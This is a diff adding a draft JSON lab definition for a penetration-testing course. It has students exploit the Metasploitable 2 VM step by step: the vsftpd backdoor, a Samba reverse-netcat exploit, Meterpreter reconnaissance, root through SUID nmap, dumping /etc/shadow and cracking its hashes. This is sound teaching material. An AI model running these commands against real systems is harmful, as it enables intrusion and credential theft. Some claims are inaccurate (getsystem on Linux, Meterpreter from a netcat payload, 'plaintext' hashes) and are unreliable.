@@ -1,0 +1,31 @@
+{
+  "asset_type": "lab",
+  "title": "Metasploit Exploitation & Privilege Escalation on Metasploitable 2",
+  "description": "Students exploit the vsftpd 2.3.4 backdoor to gain initial access, then escalate privileges to root using Metasploit post-exploitation modules and manual techniques, documenting each step for a professional penetration test report.",
+  "tags": ["metasploit", "exploitation", "privilege-escalation", "meterpreter", "post-exploitation"],
+  "status": "draft",
+  "objective": "Students will gain an initial foothold using a known backdoor vulnerability, transition to a Meterpreter session, perform post-exploitation reconnaissance, escalate privileges to root, and extract credential hashes — culminating in a professional findings writeup with evidence.",
+  "steps": [
+    {
+      "title": "Initial Exploitation via vsftpd 2.3.4 Backdoor",
+      "instructions": "The vsftpd 2.3.4 package (CVE-2011-2523) contains a backdoor that opens a command shell on port 6200 when a username containing a smiley face `:)` is sent. Use Metasploit to exploit this.\n\n```bash\n# Start Metasploit\nmsfconsole -q\n\n# Search for the exploit\nmsf6 > search vsftpd\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 exploit(...) > show options\nmsf6 exploit(...) > set RHOSTS <TARGET>\nmsf6 exploit(...) > run\n```\n\nYou should receive a command shell. Verify access:\n\n```bash\nid\nwhoami\nhostname\nuname -a\n```\n\nDocument: CVE number, exploit module path, exact output of `id` command."
+    },
+    {
+      "title": "Upgrade to Meterpreter Session",
+      "instructions": "The vsftpd exploit gives a basic shell. Upgrade to a full Meterpreter session for richer post-exploitation capabilities.\n\n```bash\n# In msfconsole, background the current session\n^Z   # or type: background\n\n# Use the shell-to-meterpreter upgrade module\nmsf6 > use post/multi/manage/shell_to_meterpreter\nmsf6 post(...) > set SESSION 1\nmsf6 post(...) > run\n\n# Interact with the new Meterpreter session\nmsf6 > sessions -l\nmsf6 > sessions -i 2\n```\n\nAlternatively, exploit Metasploitable's Samba (port 445) directly to get Meterpreter:\n\n```bash\nmsf6 > use exploit/multi/samba/usermap_script\nmsf6 exploit(...) > set RHOSTS <TARGET>\nmsf6 exploit(...) > set PAYLOAD cmd/unix/reverse_netcat\nmsf6 exploit(...) > run\n```\n\nIn your Meterpreter session, run: `sysinfo`, `getuid`, `ps`."
+    },
+    {
+      "title": "Post-Exploitation Reconnaissance",
+      "instructions": "With Meterpreter access established, enumerate the target system thoroughly.\n\n```bash\n# System information\nmeterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > getpid\nmeterpreter > ps\n\n# Network reconnaissance\nmeterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.56.0/24\nmeterpreter > run post/linux/gather/enum_network\n\n# Find sensitive files\nmeterpreter > run post/linux/gather/enum_configs\nmeterpreter > run post/linux/gather/enum_users_history\n\n# Check for local exploit opportunities\nmeterpreter > run post/multi/recon/local_exploit_suggester\n```\n\nDocument: list of running processes, network interfaces, any other hosts discovered, and local exploits suggested."
+    },
+    {
+      "title": "Privilege Escalation to Root",
+      "instructions": "Escalate from the current user to root using discovered vulnerabilities.\n\n**Method A — getsystem (if applicable):**\n```bash\nmeterpreter > getsystem\n```\n\n**Method B — Local Kernel Exploit:**\n```bash\n# Drop to shell\nmeterpreter > shell\n\n# Check kernel version\nuname -a\n# Result: Linux metasploitable 2.6.24-16-server ...\n\n# Search for kernel exploits\nmsf6 > use post/multi/recon/local_exploit_suggester\n# Then use recommended exploit\n```\n\n**Method C — SUID Abuse:**\n```bash\n# Find SUID binaries\nfind / -perm -4000 2>/dev/null\n\n# nmap has SUID on Metasploitable!\nnmap --interactive\nnmap> !sh\nid  # Should show root\n```\n\nVerify root access with `id` and `cat /etc/shadow`."
+    },
+    {
+      "title": "Credential Harvesting & Report Compilation",
+      "instructions": "Extract credentials and compile all evidence into a penetration test report section.\n\n```bash\n# Dump password hashes (from Meterpreter with root)\nmeterpreter > run post/linux/gather/hashdump\n\n# Or from shell:\ncat /etc/shadow\n\n# Download the shadow file for offline cracking\nmeterpreter > download /etc/shadow /root/lab07/shadow.txt\n\n# Attempt offline hash cracking with John the Ripper\njohn /root/lab07/shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt\njohn /root/lab07/shadow.txt --show\n```\n\n**Report Section to Write (include in submission):**\n\n| Finding | Severity | CVE | Evidence |\n|---------|----------|-----|----------|\n| vsftpd Backdoor | Critical | CVE-2011-2523 | Screenshot of id=root |\n| Root via SUID nmap | High | N/A | Screenshot of nmap --interactive |\n| Plaintext hashes in /etc/shadow | High | N/A | Redacted shadow file extract |\n\nWrite a remediation recommendation for each finding (minimum 2 sentences each)."
+    }
+  ],
+  "expected_output": "A penetration test report section (PDF) covering: exploit used with CVE reference, screenshot chain from initial shell to root, password hashes obtained (redacted), credential cracking results, and remediation recommendations table."
+}
